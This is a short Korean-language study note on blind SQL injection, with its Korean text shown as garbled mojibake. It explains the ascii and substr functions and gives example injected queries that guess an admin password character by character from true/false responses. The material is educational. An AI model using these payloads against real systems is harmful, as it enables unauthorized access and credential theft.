# Blind SQL Injection

<aside>
๐ข ํด๋น ๊ณต๊ฒฉ ๊ธฐ๋ฒ์ `์ค๋ฌด๊ณ ๊ฐ ๊ฒ์`๊ณผ ๋น์ทํ ๋งค์ปค๋์ฆ !!

</aside>

์ง์ ๊ฒฐ๊ณผ๋ฅผ ์ด์ฉ์๊ฐ ํ๋ฉด์์ ์ง์  ํ์ธํ์ง ๋ชปํ  ๋,

์ฐธ / ๊ฑฐ์ง ๋ฐํ ๊ฒฐ๊ณผ๋ก ๋ฐ์ดํฐ๋ฅผ ํ๋ํ๋ ๊ณต๊ฒฉ ๊ธฐ๋ฒ์ `Blind SQL Injection` ์ด๋ผ๊ณ  ํ๋ค.

๊ทธ ์ ์ ์ฐ์ด๋ ๊ณต๊ฒฉ์ ์ฐ์ด๋ ํจ์๋ค์ ์์๋ณด์.

### ascii

---

์ ๋ฌ๋ ๋ฌธ์๋ฅผ `์์คํค ํํ๋ก ๋ณํ`ํ๋ ํจ์.

์๋ฅผ ๋ค์ด `ascii(โaโ)` ๋ฅผ ์คํํ๋ฉด โaโ ๋ฌธ์์ ์์คํค ๊ฐ์ธ `97`์ ๋ฐํ.

### substr

---

> `substr(string, position, length)`
> 

substr ํจ์์ ์ ๋ฌ๋๋ ์ธ์๋ ์์ ๊ฐ๋ค.

์๋์ ์ฝ๋๋ ์ฌ์ฉ ์์

```sql
substr('ABCD',1,1) //๊ฒฐ๊ณผ๊ฐ = 'A'
substr('ABCD',2,2) //๊ฒฐ๊ณผ๊ฐ = 'BC'
```

## ๊ณต๊ฒฉ์ฝ๋

---

```sql
# ์ฒซ ๋ฒ์งธ ๊ธ์ ๊ตฌํ๊ธฐ (์์คํค 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
# ๋ ๋ฒ์งธ ๊ธ์ ๊ตฌํ๊ธฐ (์์คํค 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True
```

์ด์ ๊ฐ์ด ์ฐธ / ๊ฑฐ์ง ๋ฐํ ๊ฐ์ ํตํด ๊ณต๊ฒฉ์ ํ๋ค.

ํ์ง๋ง ์ด๋ ๊ฒ ๊ณต๊ฒฉ์ ํ๊ฒ ๋๋ค๋ฉด ๋๋ฌด `๋ง์ ์๊ฐ`์ด ๋ค๊ณ  `๋นํจ์จ์ `์ด๋ค.

๋ฐ๋ผ์ ๋๋ถ๋ถ `์๋ํ ์คํฌ๋ฆฝํธ`๋ฅผ ์ง์ ๊ณต๊ฒฉ์ ํ๋ค.